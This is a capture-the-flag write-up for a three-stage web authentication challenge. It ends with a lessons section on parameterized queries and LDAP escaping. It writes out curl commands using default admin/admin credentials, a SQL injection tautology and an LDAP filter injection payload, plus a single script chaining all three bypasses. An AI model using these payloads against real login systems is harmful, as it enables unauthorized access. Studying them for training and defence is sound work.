---
ctf: "Curtin CTF 2026"
title: "The Future of Intelligent Logistics"
category: "web"
difficulty: ""
tags: ["auth-bypass", "sqli", "ldap-injection", "hardcoded-creds"]
flag_format: "CURTIN_CTF{...}"
date: "2026-11-21"
---

## Challenge

Experience next-generation global supply chain management through intelligent fleet coordination, real-time maritime telemetry, automated freight forwarding, and seamless enterprise connectivity.

**Target:** http://56.10.62.200:8080/

A three-stage authentication chain, each stage a different classic auth vulnerability. Chain all three to reach the executive console that holds the flag.

---

## Approach

### Phase 1 — Analyze

Loaded the landing page (`Nexora Logistics & Supply Chain Cloud`). The page source contained a comment pointing to the first login:

```html
<!-- Internal portal link disguise: Partner Dispatch Gateway -->
```

The chain is: `partner_dispatch_auth.php` → `fleet_ops_node.php` → `directory_auth_service.php`. No robots.txt, no /api, no source backups — the attack surface is the login chain itself.

Server headers: `Apache/2.4.71 (Debian)`, `X-Powered-By: PHP/8.2.36`.

---

### Phase 2 — Recon

Each stage leaked its own hint in an HTML comment:

**Stage 1** (`partner_dispatch_auth.php`) — fields `operator_id` / `station_key`:
```html
<!-- NOTICE TO DISPATCH INTEGRATORS: For unconfigured terminals, use standard
     factory credentials (admin / admin). Change credentials immediately upon onboarding. -->
```

**Stage 2** (`fleet_ops_node.php`) — fields `operator_token` / `pin_hash`:
```html
<!-- System Architecture Comment: Authentication mediated through internal SQLite storage cluster node-02 -->
```

**Stage 3** (`directory_auth_service.php`) — LDAP auth form; error message echoed the raw filter:
```
Active Directory Service rejection: Object matching search filter
'(&(uid=sys_chief_directory)(userPassword=***))' not found or credentials invalid.
Endpoint: ldaps://directory-auth.nexora-internal.corp:636
```
HTML also leaked:
```html
<!-- LDAP Base DN: dc=nexora,dc=corp | ObjectClass: inetOrgPerson -->
```

---

### Phase 3 — Infiltrate

#### Stage 1 — Hardcoded factory credentials

```bash
curl -s -i -c cj.txt -X POST http://56.10.62.200:8080/partner_dispatch_auth.php \
  --data 'operator_id=admin&station_key=admin'
# 302 -> Location: fleet_ops_node.php?token=sec_ops_38f9d0e21a
```

#### Stage 2 — SQLite SQL injection auth bypass

The login builds a raw SQLite query; injecting an always-true tautology (`' OR 1=1-- -`) makes it return a row regardless of credentials.

```bash
TOK="sec_ops_38f9d0e21a"
curl -s -i -b cj.txt -c cj.txt -X POST "http://56.10.62.200:8080/fleet_ops_node.php?token=$TOK" \
  --data-urlencode "operator_token=' OR 1=1-- -" \
  --data-urlencode "pin_hash=x"
# 302 -> Location: directory_auth_service.php?session_ctx=ad_srv_9921b7c4
```

#### Stage 3 — LDAP injection (ActiveDirectory)

The search filter template is:
```
(&(uid=[LDAP_USER])(userPassword=[LDAP_PASS]))
```

Plain wildcard `(userPassword=*)` doesn't work on ActiveDirectory because `unicodePwd` is not searchable. The fix is to inject an `OR` into the `uid` field so the password clause becomes irrelevant.

**Payload:** `ldap_user = sys_chief_directory)(|(uid=*`, `ldap_pass = x`

This transforms the filter to:
```
(&(uid=sys_chief_directory)(|(uid=*)(userPassword=x)))
```
`(|(uid=*)(userPassword=x))` is always true (uid=* matches everything), so it reduces to "find sys_chief_directory" — authenticated regardless of password.

```bash
CTX="ad_srv_9921b7c4"
curl -s -i -L -b cj.txt -c cj.txt -X POST "http://56.10.62.200:8080/directory_auth_service.php?session_ctx=$CTX" \
  --data-urlencode "ldap_user=sys_chief_directory)(|(uid=*" \
  --data-urlencode "ldap_pass=x" > fin.html
grep -aoiE 'curtin_ctf\{[^}]*\}' fin.html
```

Lands in **Nexora Operations Central** (authenticated as *Arthur Vance*, Tier-3 Executive). The pinned "System Security Audit Daemon" note contained the flag.

---

### Full chain (one script)

```bash
B=http://56.10.62.200:8080
curl -s -c cj.txt -X POST $B/partner_dispatch_auth.php \
  --data 'operator_id=admin&station_key=admin' >/dev/null
curl -s -b cj.txt -c cj.txt -X POST "$B/fleet_ops_node.php?token=sec_ops_38f9d0e21a" \
  --data-urlencode "operator_token=' OR 1=1-- -" --data-urlencode "pin_hash=x" >/dev/null
curl -s -b cj.txt -c cj.txt -X POST "$B/directory_auth_service.php?session_ctx=ad_srv_9921b7c4" \
  --data-urlencode "ldap_user=sys_chief_directory)(|(uid=*" --data-urlencode "ldap_pass=x" \
  | grep -aoiE 'curtin_ctf\{[^}]*\}'
```

> Note: `token`/`session_ctx` values are session-tied. Grab fresh ones from each stage's `Location:` header if they rotate.

---

## Tools

- `curl` — all three stages (cookie jar `-c`/`-b`, `--data-urlencode` for injections)
- Browser DevTools — reading HTML comments and echoed error messages

---

## Lessons

- **Never put credentials (even "default") in HTML comments** — they're served to every client.
- **Use parameterized queries / prepared statements** — string-building a SQLite auth query allows trivial `' OR 1=1-- -` bypass.
- **Escape LDAP metacharacters** (`*()\|&` → `\2a\28\29…` per RFC 4515); for auth, **bind as the user** rather than search-and-check.
- **Never echo the constructed LDAP filter in error messages** — it handed us the exact injection template.
- **Defense in depth ≠ a chain of bypassable gates** — three independently broken layers = zero security. Each tier must actually authenticate.

---

## Flag

```
CURTIN_CTF{redacted}
```
